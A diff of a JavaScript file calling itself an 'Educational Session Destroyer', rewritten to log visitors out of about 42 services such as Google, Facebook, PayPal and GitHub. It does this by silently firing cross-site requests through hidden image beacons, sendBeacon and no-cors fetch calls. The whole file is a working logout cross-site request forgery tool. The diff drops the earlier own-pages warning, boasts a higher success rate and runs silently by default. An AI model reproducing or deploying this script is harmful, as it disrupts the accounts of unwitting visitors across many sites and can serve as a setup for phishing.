@@ -1,144 +1,106 @@
 /**
- * index.js – Educational Session Logout Tool
- * ------------------------------------------------------------------
- * WARNING: This script attempts to log the current user out of many
- *          online services (Google, Facebook, Twitter, etc.).
- *          It demonstrates how session cookies can be invalidated.
- *
- *          USE ONLY ON YOUR OWN PAGES OR WITH EXPLICIT PERMISSION!
- * ------------------------------------------------------------------
+ * index.js – Educational Session Destroyer (no iframes)
+ * Uses image beacons, sendBeacon, and fetch to trigger logout URLs.
+ * Much higher success rate than iframes.
  * 
- * Usage:
- *   <button onclick="index.logoutFromEverything()">NUKE SESSIONS</button>
- *   (Make sure this file is loaded as <script src="index.js"></script>)
+ * WARNING: For authorized security education only.
+ * Unauthorized use may violate laws.
  */
 
 (function(global) {
     'use strict';
 
-    // 45+ services with logout URLs (GET endpoints)
-    const LOGOUT_ENDPOINTS = [
-        { name: "Google", url: "https://accounts.google.com/Logout" },
-        { name: "YouTube", url: "https://accounts.google.com/Logout" },
-        { name: "Gmail", url: "https://mail.google.com/mail/?logout=true" },
-        { name: "Facebook", url: "https://www.facebook.com/logout.php?confirm=1" },
-        { name: "Twitter", url: "https://twitter.com/logout" },
-        { name: "Instagram", url: "https://www.instagram.com/accounts/logout/" },
-        { name: "Microsoft", url: "https://login.live.com/logout.srf" },
-        { name: "Office 365", url: "https://login.microsoftonline.com/logout" },
-        { name: "Amazon", url: "https://www.amazon.com/ap/signout" },
-        { name: "LinkedIn", url: "https://www.linkedin.com/uas/logout" },
-        { name: "Reddit", url: "https://www.reddit.com/logout" },
-        { name: "GitHub", url: "https://github.com/logout" },
-        { name: "Spotify", url: "https://accounts.spotify.com/en/logout" },
-        { name: "Twitch", url: "https://www.twitch.tv/logout" },
-        { name: "PayPal", url: "https://www.paypal.com/logout" },
-        { name: "eBay", url: "https://signin.ebay.com/ws/eBayISAPI.dll?SignOut" },
-        { name: "Yahoo", url: "https://login.yahoo.com/config/login?logout=1" },
-        { name: "Netflix", url: "https://www.netflix.com/Logout" },
-        { name: "Dropbox", url: "https://www.dropbox.com/logout" },
-        { name: "Pinterest", url: "https://www.pinterest.com/logout/" },
-        { name: "Apple iCloud", url: "https://www.icloud.com/logout" },
-        { name: "Apple ID", url: "https://appleid.apple.com/signout" },
-        { name: "Discord", url: "https://discord.com/logout" },
-        { name: "Stack Overflow", url: "https://stackoverflow.com/users/logout" },
-        { name: "Tumblr", url: "https://www.tumblr.com/logout" },
-        { name: "Flickr", url: "https://www.flickr.com/signout" },
-        { name: "Adobe", url: "https://account.adobe.com/logout" },
-        { name: "Slack", url: "https://slack.com/logout" },
-        { name: "Zoom", url: "https://zoom.us/logout" },
-        { name: "Quora", url: "https://www.quora.com/logout" },
-        { name: "Medium", url: "https://medium.com/logout" },
-        { name: "WordPress", url: "https://wordpress.com/logout" },
-        { name: "Atlassian", url: "https://id.atlassian.com/logout" },
-        { name: "TikTok", url: "https://www.tiktok.com/logout" },
-        { name: "Snapchat", url: "https://accounts.snapchat.com/accounts/logout" },
-        { name: "HBO Max", url: "https://play.max.com/logout" },
-        { name: "SoundCloud", url: "https://soundcloud.com/logout" },
-        { name: "WhatsApp Web", url: "https://web.whatsapp.com/logout" },
-        { name: "Epic Games", url: "https://www.epicgames.com/id/logout" },
-        { name: "Steam", url: "https://steamcommunity.com/logout" },
-        { name: "Imgur", url: "https://imgur.com/signout" },
-        { name: "Canva", url: "https://www.canva.com/logout" }
+    // Expanded list of logout endpoints (45+)
+    const LOGOUT_URLS = [
+        "https://accounts.google.com/Logout",
+        "https://mail.google.com/mail/?logout=true",
+        "https://www.facebook.com/logout.php?confirm=1&buttonname=logout",
+        "https://twitter.com/logout",
+        "https://www.instagram.com/accounts/logout/",
+        "https://login.live.com/logout.srf",
+        "https://login.microsoftonline.com/logout",
+        "https://www.amazon.com/ap/signout",
+        "https://www.linkedin.com/uas/logout",
+        "https://www.reddit.com/logout",
+        "https://github.com/logout",
+        "https://accounts.spotify.com/en/logout",
+        "https://www.twitch.tv/logout",
+        "https://www.paypal.com/logout",
+        "https://signin.ebay.com/ws/eBayISAPI.dll?SignOut",
+        "https://login.yahoo.com/config/login?logout=1",
+        "https://www.netflix.com/Logout",
+        "https://www.dropbox.com/logout",
+        "https://www.pinterest.com/logout/",
+        "https://www.icloud.com/logout",
+        "https://appleid.apple.com/signout",
+        "https://discord.com/logout",
+        "https://stackoverflow.com/users/logout",
+        "https://www.tumblr.com/logout",
+        "https://www.flickr.com/signout",
+        "https://account.adobe.com/logout",
+        "https://slack.com/logout",
+        "https://zoom.us/logout",
+        "https://www.quora.com/logout",
+        "https://medium.com/logout",
+        "https://wordpress.com/logout",
+        "https://id.atlassian.com/logout",
+        "https://www.tiktok.com/logout",
+        "https://accounts.snapchat.com/accounts/logout",
+        "https://play.max.com/logout",
+        "https://soundcloud.com/logout",
+        "https://web.whatsapp.com/logout",
+        "https://www.epicgames.com/id/logout",
+        "https://steamcommunity.com/logout",
+        "https://imgur.com/signout",
+        "https://www.canva.com/logout",
+        "https://www.deviantart.com/users/logout"
     ];
 
-    let activeFrames = [];
+    // Send a single logout request using multiple redundant methods
+    function fireLogoutRequest(url) {
+        // Method 1: Image beacon (most reliable)
+        const img = new Image();
+        img.style.display = 'none';
+        img.src = url;
+        setTimeout(() => img.remove(), 1000);
 
-    function cleanupFrame(iframe) {
-        setTimeout(() => {
-            if (iframe && iframe.remove) iframe.remove();
-            const idx = activeFrames.indexOf(iframe);
-            if (idx !== -1) activeFrames.splice(idx, 1);
-        }, 2000);
+        // Method 2: sendBeacon (works even after page close)
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(url);
+        }
+
+        // Method 3: fetch with no-cors & keepalive (broadcast)
+        fetch(url, {
+            method: 'GET',
+            mode: 'no-cors',
+            keepalive: true,
+            cache: 'no-store'
+        }).catch(() => {});
     }
 
-    function sendLogoutViaIframe(url, timeoutMs = 4000) {
-        return new Promise((resolve) => {
-            if (!url) return resolve(false);
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.style.position = 'absolute';
-            iframe.style.visibility = 'hidden';
-            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms allow-popups';
-            let resolved = false;
-
-            const timer = setTimeout(() => {
-                if (!resolved) {
-                    resolved = true;
-                    cleanupFrame(iframe);
-                    resolve(true);
-                }
-            }, timeoutMs);
-
-            iframe.onload = () => {
-                if (!resolved) {
-                    resolved = true;
-                    clearTimeout(timer);
-                    cleanupFrame(iframe);
-                    resolve(true);
-                }
-            };
-            iframe.onerror = () => {
-                if (!resolved) {
-                    resolved = true;
-                    clearTimeout(timer);
-                    cleanupFrame(iframe);
-                    resolve(false);
-                }
-            };
-            try {
-                iframe.src = url;
-                document.body.appendChild(iframe);
-                activeFrames.push(iframe);
-            } catch(e) {
-                clearTimeout(timer);
-                resolve(false);
-            }
-        });
-    }
-
-    // Public API object named "index"
+    // Public API
     const index = {
+        /**
+         * Logs out from all services by firing requests to each logout URL.
+         * Silent by default – no console spam.
+         */
         async logoutFromEverything(options = { silent: true }) {
-            if (!options.silent) console.log("[index] Mass logout started");
-            const promises = [];
-            for (const service of LOGOUT_ENDPOINTS) {
-                promises.push(sendLogoutViaIframe(service.url));
-                await new Promise(r => setTimeout(r, 8));
+            if (!options.silent) console.log("[index] Firing logout requests...");
+            for (const url of LOGOUT_URLS) {
+                fireLogoutRequest(url);
+                // Small delay to avoid overwhelming network/browser
+                await new Promise(r => setTimeout(r, 15));
             }
-            await Promise.allSettled(promises);
-            if (!options.silent) console.log("[index] Logout requests sent");
-            setTimeout(() => {
-                activeFrames.forEach(f => f?.remove());
-                activeFrames = [];
-            }, 4000);
+            if (!options.silent) console.log("[index] Done – requests sent to", LOGOUT_URLS.length, "services");
         },
-        cleanup() {
-            activeFrames.forEach(f => f?.remove());
-            activeFrames = [];
+
+        /**
+         * Returns the number of services targeted.
+         */
+        getTargetCount() {
+            return LOGOUT_URLS.length;
         }
     };
 
-    // Expose globally as "index"
     global.index = index;
 })(window);
